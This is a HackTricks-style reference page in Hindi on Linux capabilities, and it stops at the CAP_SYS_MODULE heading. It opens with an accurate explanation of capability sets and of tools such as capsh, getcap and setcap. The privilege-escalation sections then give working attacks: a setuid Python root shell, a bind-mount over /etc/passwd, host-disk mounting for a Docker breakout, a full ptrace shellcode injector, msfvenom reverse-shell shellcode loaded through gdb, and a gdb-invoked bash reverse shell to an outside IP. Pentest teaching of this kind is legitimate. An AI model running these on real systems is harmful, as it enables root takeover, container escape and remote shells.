# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities **root privileges को छोटी, अलग-अलग units में विभाजित करती हैं**, जिससे processes के पास privileges का केवल एक subset हो सकता है। इससे अनावश्यक रूप से full root privileges न देकर risks कम किए जाते हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### The Problem:

- Normal users के पास raw sockets खोलने या 1024 से कम वाले Internet ports को bind करने जैसे operations के लिए सीमित permissions होती हैं; capabilities full root privilege देने के बजाय केवल आवश्यक operation की अनुमति दे सकती हैं।<sup>[[14]](#references)</sup>

### Capability Sets:

Linux प्रति thread इन capability sets को expose करता है, और kernel तब इनकी constraints लागू करता है जब कोई process credentials बदलता है या कोई file execute करता है।<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Purpose**: उन capabilities की पहचान करता है जो `execve()` के बाद permitted set में शामिल हो सकती हैं, जब executed file में matching inheritable file capabilities हों।
- **Functionality**: Thread का inheritable set `execve()` के दौरान preserved रहता है; यह अपने-आप उन capabilities को effective नहीं बनाता।
- **Restrictions**: इस set में capability जोड़ना permitted और bounding sets द्वारा constrained होता है।<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Purpose**: उन actual capabilities को दर्शाता है जिनका process किसी भी समय उपयोग कर रहा है।
- **Functionality**: यह capabilities का वह set है जिसे kernel विभिन्न operations की permission देने के लिए check करता है। Files के लिए, यह set एक flag हो सकता है जो बताता है कि file की permitted capabilities को effective माना जाना है या नहीं।
- **Significance**: Effective set तत्काल privilege checks के लिए महत्वपूर्ण है और capabilities के उस active set के रूप में कार्य करता है जिसका process उपयोग कर सकता है।

3. **Permitted (CapPrm)**:

- **Purpose**: उन capabilities के maximum set को define करता है जिन्हें कोई process possess कर सकता है।
- **Functionality**: कोई process permitted set से किसी capability को अपने effective set में elevate कर सकता है, जिससे उसे उस capability का उपयोग करने की ability मिलती है। वह अपने permitted set से capabilities को drop भी कर सकता है।
- **Boundary**: यदि कोई capability इस set से drop कर दी जाती है, तो सामान्यतः उसे उस capability को grant करने वाली file execute किए बिना या किसी अन्य privileged transition के बिना restore नहीं किया जा सकता।<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Purpose**: `execve()` के दौरान कोई process किसी file से प्राप्त कर सकने वाली capabilities और अपने inheritable set में जोड़ सकने वाली capabilities को limit करता है।
- **Functionality**: यह set `fork()` के दौरान inherited और `execve()` के दौरान preserved रहता है; caller के पास `CAP_SETPCAP` होने पर capabilities को इससे drop किया जा सकता है।
- **Use-case**: इस set से अनावश्यक capabilities हटाने पर बाद में privilege acquisition सीमित हो जाता है।<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Purpose**: selected capabilities को किसी nonprivileged program के `execve()` के दौरान permitted और effective बने रहने देता है।
- **Functionality**: जब executed file privileged नहीं होती, तब ambient capabilities नए permitted और effective sets में add कर दी जाती हैं।
- **Restrictions**: कोई capability ambient तभी हो सकती है जब वह permitted और inheritable दोनों sets में मौजूद हो; set-user-ID/set-group-ID file या capabilities वाली file execute करने पर ambient set clear हो जाता है।<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Processes & Binaries Capabilities

### Processes Capabilities

किसी particular process की capabilities देखने के लिए /proc directory में मौजूद **status** file का उपयोग करें। चूंकि यह अधिक details प्रदान करती है, इसलिए इसे केवल Linux capabilities से संबंधित information तक सीमित करते हैं।\
ध्यान दें कि सभी running processes के लिए capability information प्रति thread maintain की जाती है, जबकि file capabilities `security.capability` extended attributes में stored होती हैं।<sup>[[14]](#references)[[15]](#references)</sup>

आप `/usr/include/linux/capability.h` में defined capabilities देख सकते हैं।

आप current process की capabilities `cat /proc/self/status` या `capsh --print` से देख सकते हैं, और अन्य processes की capabilities `/proc/<pid>/status` में देख सकते हैं।<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
यह command अधिकांश systems पर capabilities की पाँच lines return करनी चाहिए।<sup>[[15]](#references)</sup>

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
ये hexadecimal numbers समझ में नहीं आते। `capsh` utility का उपयोग करके, हम इन्हें capability names में decode कर सकते हैं।<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
आइए अब `ping` द्वारा उपयोग की जाने वाली **capabilities** की जाँच करें:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
हालांकि यह काम करता है, एक और आसान तरीका है। किसी चल रही process की capabilities देखने के लिए, **getpcaps** tool के बाद उसकी process ID (PID) दें; यह process IDs की सूची भी स्वीकार करता है।<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
आइए नेटवर्क sniff करने के लिए binary `tcpdump` को `cap_net_admin` और `cap_net_raw` देने के बाद उसकी capabilities जाँचते हैं (`tcpdump` process 9562 में चल रहा है)।<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
जैसा कि आप देख सकते हैं, capabilities किसी process की जाँच करने के दोनों तरीकों के परिणामों से मेल खाती हैं। `getpcaps` tool किसी target process की capabilities को query करने के लिए libcap का उपयोग करता है और उन्हें text form में print करता है; यह एक या अधिक PIDs स्वीकार करता है।<sup>[[22]](#references)</sup>

### Binaries Capabilities

Binaries में file capabilities हो सकती हैं, जो execution के दौरान लागू होती हैं। उदाहरण के लिए, किसी `ping` binary में `cap_net_raw` capability हो सकती है।<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
आप `getcap -r` का उपयोग करके **capabilities** वाली binaries को **search** कर सकते हैं।<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### capsh के साथ capabilities को drop करना

यदि हम prevailing bounding set से `CAP_NET_RAW` को drop कर देते हैं, तो जिस program को उस capability की आवश्यकता है, उसे अब इसका उपयोग नहीं कर पाना चाहिए।<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ के आउटपुट के अलावा, _tcpdump_ command को भी स्वयं एक error दिखानी चाहिए।

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

यह error दिखाती है कि `CAP_NET_RAW` को bounding set से हटाने के बाद `tcpdump`, अनुरोधित file capability के साथ execute नहीं हो सकता।

### Capabilities हटाएँ

आप `setcap -r` के साथ किसी file की capabilities हटा सकते हैं।<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Linux किसी login user को सीधे file capabilities असाइन नहीं करता, लेकिन `pam_cap` PAM module `/etc/security/capability.conf` का उपयोग करके authenticated sessions के लिए inheritable capabilities सेट कर सकता है।<sup>[[16]](#references)</sup> प्रत्येक entry comma-separated capability names या numbers को एक या अधिक usernames से map करती है।<sup>[[17]](#references)</sup>
File example:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

निम्नलिखित program को compile करने पर **ऐसे environment के अंदर bash shell spawn करना संभव हो जाता है जो capabilities प्रदान करता है**।<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**compiled ambient binary द्वारा execute किए गए bash** के अंदर **नई capabilities** देखना संभव है (एक सामान्य user के पास "current" section में कोई capability नहीं होगी)।<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> आप **केवल वे capabilities जोड़ सकते हैं जो** permitted और inheritable sets, दोनों में मौजूद हों।<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb binaries

Capability-dumb binary ऐसा program होता है जिसमें file capabilities होती हैं, लेकिन उन्हें manage करने के लिए libcap का उपयोग नहीं किया जाता। यदि इसका file effective bit set है, तो kernel file की permitted capabilities को process के effective set में enable करता है; यदि process ने सभी permitted capabilities प्राप्त नहीं की हैं, तो execution fail हो सकता है।<sup>[[14]](#references)</sup>

## Service Capabilities

Root के रूप में चलने वाली system service broad capabilities बनाए रख सकती है, जब तक उसका execution environment उन्हें restrict न करे। systemd unit में, `User=` service user को select करता है और `AmbientCapabilities=` executed process के ambient set में नामित capabilities जोड़ता है।<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Containers में Capabilities

Docker containers को एक default capability set के साथ शुरू करता है, जिसे `--cap-add` और `--cap-drop` के साथ बदला जा सकता है; एक example container का निरीक्षण `amicontained` से किया जा सकता है।<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities तब उपयोगी होती हैं जब आप **privileged operations करने के बाद अपनी प्रक्रियाओं को प्रतिबंधित करना चाहते हैं** (जैसे chroot सेट करने और socket से bind करने के बाद)। हालांकि, इन्हें malicious commands या arguments पास करके exploit किया जा सकता है, जिन्हें बाद में root के रूप में चलाया जाता है।<sup>[[2]](#references)</sup>

आप `setcap` के साथ programs पर file capabilities लागू कर सकते हैं और `getcap` के साथ उन्हें query कर सकते हैं।<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
File-capability text में, `+ep` नामित capability को effective और permitted sets में बढ़ाता है; `-` चुने गए flags को घटाता है।<sup>[[21]](#references)</sup>

किसी system या folder में capabilities वाले programs की पहचान करने के लिए, `getcap -r` का उपयोग करें।<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

निम्नलिखित उदाहरण में binary `/usr/bin/python2.6` को privesc के लिए vulnerable पाया गया:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
`tcpdump` को **any user** द्वारा **packets sniff** करने की अनुमति देने के लिए आवश्यक **Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "empty" capabilities का special case

एक file में empty capability set हो सकता है (`getcap myelf` `myelf =ep` return करता है)। एक empty set कोई capabilities प्रदान नहीं करता; root-owned set-user-ID bit के साथ combined होने पर भी, program executing process की effective और saved IDs को 0 में बदल सकता है, लेकिन file capabilities प्राप्त नहीं करता। `=ep` वाली unowned, non-SUID/SGID file root के रूप में run नहीं होती।<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** एक highly potent Linux capability है, जिसे अक्सर इसके व्यापक **administrative privileges** के कारण लगभग root-level के बराबर माना जाता है, जैसे devices को mount करना या kernel features को manipulate करना। Entire systems को simulate करने वाले containers के लिए यह indispensable है, लेकिन **`CAP_SYS_ADMIN` significant security challenges उत्पन्न करता है**, विशेष रूप से containerized environments में, क्योंकि इससे privilege escalation और system compromise हो सकता है। इसलिए, इसके usage के लिए stringent security assessments और cautious management आवश्यक हैं, तथा application-specific containers में इस capability को drop करना strongly preferred है, ताकि **principle of least privilege** का पालन हो और attack surface कम किया जा सके।<sup>[[14]](#references)</sup>

Namespace pivots के लिए scope महत्वपूर्ण है: `setns()` target को own करने वाले user namespace के विरुद्ध `CAP_SYS_ADMIN` check करता है। किसी mount namespace में enter करने के लिए caller के user namespace में `CAP_SYS_CHROOT` भी आवश्यक है। इसलिए, केवल private remapped user namespace के अंदर held capability initial host namespaces में arbitrary entry की अनुमति नहीं देती।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python का उपयोग करके आप संशोधित _passwd_ फ़ाइल को वास्तविक _passwd_ फ़ाइल के ऊपर mount कर सकते हैं:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
और अंत में modified `passwd` file को `/etc/passwd` पर **mount** करें:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
और आप password "password" का उपयोग करके **`su` as root** कर पाएंगे।

**environment के साथ उदाहरण (Docker breakout)**

आप निम्न का उपयोग करके docker container के अंदर enabled capabilities जांच सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले output में आप देख सकते हैं कि SYS_ADMIN capability enabled है।<sup>[[14]](#references)</sup>

- **Mount**

उपयुक्त device और namespace access के साथ, यह Docker container को **host disk mount करने और उसके contents तक access प्राप्त करने** की अनुमति दे सकता है। Device node को किसी वास्तविक host device का प्रतिनिधित्व करना चाहिए, device cgroup को इसकी अनुमति देनी चाहिए, और block-based filesystem को mount करने के लिए initial user namespace में `CAP_SYS_ADMIN` आवश्यक है।<sup>[[14]](#references)</sup>
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```
- **पूर्ण access**

पिछली method में हम host disk तक access प्राप्त करने में सफल रहे।\
यदि host पर **ssh** server चल रहा है, तो आप **mounted disk** के अंदर एक **user create** करके SSH के माध्यम से access कर सकते हैं।<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```
`/mnt/host` के अंतर्गत सीधे read और write करना पहले से ही host-filesystem access है। अंतिम `chroot` केवल pathname की सुविधा है और इसके लिए अतिरिक्त रूप से `CAP_SYS_CHROOT` आवश्यक है; यह escape बनाने वाला step नहीं है।

## CAP_SYS_PTRACE

`CAP_SYS_PTRACE` के साथ कोई process अपने PID namespace में दिखाई देने वाले अन्य processes को trace और inspect कर सकता है। Docker container से host processes को target करने के लिए host PID namespace को `--pid=host` के साथ share करें (या ऐसे namespace में join करें जिसमें target मौजूद हो)।<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** `ptrace(2)` द्वारा प्रदान की जाने वाली debugging और system call tracing functionalities तथा `process_vm_readv(2)` और `process_vm_writev(2)` जैसे cross-memory attach calls का उपयोग करने की ability प्रदान करता है। Diagnostic और monitoring purposes के लिए शक्तिशाली होने के बावजूद, यदि `CAP_SYS_PTRACE` को `ptrace(2)` पर seccomp filter जैसे restrictive measures के बिना enable किया गया हो, तो यह system security को काफी कमजोर कर सकता है। विशेष रूप से, इसका उपयोग अन्य security restrictions को circumvent करने के लिए किया जा सकता है, खासकर seccomp द्वारा लगाई गई restrictions को, जैसा कि [proofs of concept (PoC) like this one](https://gist.github.com/thejh/8346f47e359adecd1d53) में प्रदर्शित किया गया है।<sup>[[10]](#references)</sup>

**Binary के साथ example (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**binary के साथ उदाहरण (gdb)**

`ptrace` capability वाला `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
gdb के माध्यम से memory में inject करने के लिए msfvenom से shellcode बनाएं
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
gdb के साथ root process को debug करें और पहले जेनरेट की गई gdb lines को copy-paste करें:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**environment के साथ उदाहरण (Docker breakout) - एक और gdb Abuse**

यदि **GDB** installed है (या उदाहरण के लिए इसे `apk add gdb` या `apt install gdb` से install कर सकते हैं), तो आप **visible host process** को **debug** कर सकते हैं और उससे `system` function call करवा सकते हैं। इसके लिए target के user namespace में effective `CAP_SYS_PTRACE` और host PID visibility आवश्यक है; इसके लिए `CAP_SYS_ADMIN` की आवश्यकता नहीं है। Yama, non-dumpable state, seccomp और LSM policy अब भी attach को block कर सकते हैं।
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
आप command का executed output नहीं देख पाएंगे, लेकिन इसे उस process द्वारा execute किया जाएगा (इसलिए एक rev shell प्राप्त करें)।

> [!WARNING]
> यदि आपको error `"No symbol "system" in current context."` मिलता है, तो gdb के माध्यम से किसी program में shellcode load करने वाला पिछला example देखें।

**Environment के साथ example (Docker breakout) - Shellcode Injection**

आप निम्नलिखित का उपयोग करके docker container के अंदर enabled capabilities देख सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**host** में चल रहे **processes** की सूची बनाएं `ps -eaf`

1. **architecture** प्राप्त करें `uname -m`
2. architecture के लिए **shellcode** खोजें ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. किसी process की memory में **shellcode** को **inject** करने के लिए कोई **program** खोजें ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. program के अंदर **shellcode** को **Modify** करें और इसे **compile** करें `gcc inject.c -o inject`
5. इसे **Inject** करें और अपना **shell** प्राप्त करें: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

